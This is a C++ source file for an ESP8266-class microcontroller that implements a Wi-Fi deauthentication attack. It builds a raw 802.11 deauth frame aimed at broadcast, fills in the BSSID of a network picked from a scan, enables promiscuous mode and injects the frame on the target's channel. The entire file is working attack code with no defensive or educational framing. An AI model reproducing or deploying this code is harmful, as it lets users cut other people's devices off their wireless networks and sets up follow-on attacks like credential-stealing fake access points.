/*
 * Deauthentication CPP File
 * Author -  WireBits
 */

#include "deauth.h"

extern struct WiFiNetwork {
  String ssid;
  uint8_t bssid[6];
  int channel;
  int rssi;
} scannedNetworks[50];

int targetChannel = 1;
uint8_t targetBSSID[6];
bool deauthRunning = false;
bool deauthExecuted = false;

const uint8_t deauthPacket[26] = {
  0xc0, 0x00, 0x3a, 0x01,
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x07, 0x00
};

void startDeauth(int index) {
  extern int networkCount;
  if (index < 0 || index >= networkCount) {
    Serial.println("[!] Invalid index!");
    return;
  }
  memcpy(targetBSSID, scannedNetworks[index].bssid, 6);
  targetChannel = scannedNetworks[index].channel;
  Serial.printf("[*] Deauth Attack Started on %s (Channel: %d)\n",scannedNetworks[index].ssid.c_str(), targetChannel);
  WiFi.disconnect();
  wifi_promiscuous_enable(1);
  wifi_set_channel(targetChannel);
  deauthRunning = true;
  deauthExecuted = true;
}

void stopDeauth() {
  deauthRunning = false;
  wifi_promiscuous_enable(0);
  WiFi.mode(WIFI_STA);
  digitalWrite(2, HIGH);
  Serial.println("[*] Deauth Attack Stopped!");
}

void sendDeauth() {
  uint8_t packet[26];
  memcpy(packet, deauthPacket, 26);
  memcpy(&packet[10], targetBSSID, 6);
  memcpy(&packet[16], targetBSSID, 6);
  wifi_send_pkt_freedom(packet, 26, 0);
}

void initDeauth() {
  deauthRunning = false;
  deauthExecuted = false;
}
